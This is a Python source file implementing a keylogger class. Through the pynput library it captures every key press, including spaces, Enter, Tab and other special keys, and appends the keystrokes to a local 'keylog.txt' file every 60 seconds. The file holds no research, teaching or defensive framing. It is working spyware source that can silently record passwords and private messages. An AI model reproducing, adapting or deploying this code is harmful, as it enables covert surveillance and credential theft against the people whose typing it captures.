import os
import sys
import time
from pynput import keyboard
from threading import Thread

# Configuration
LOG_FILE = "keylog.txt"
INTERVAL = 60  # Report interval in seconds

class Keylogger:
    def __init__(self):
        self.log = ""
        self.report_interval = INTERVAL
        self.start_time = time.time()

    def append_to_log(self, string):
        self.log += string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.enter:
                current_key = "\n"
            elif key == key.tab:
                current_key = "\t"
            else:
                current_key = f" [{key}] "

        self.append_to_log(current_key)

    def report(self):
        if self.log:
            with open(LOG_FILE, "a") as f:
                f.write(self.log)
            self.log = ""
        self.start_time = time.time()

    def run(self):
        # Start the listener
        keyboard_listener = keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            while True:
                if time.time() > self.start_time + self.report_interval:
                    self.report()
                time.sleep(0.1)

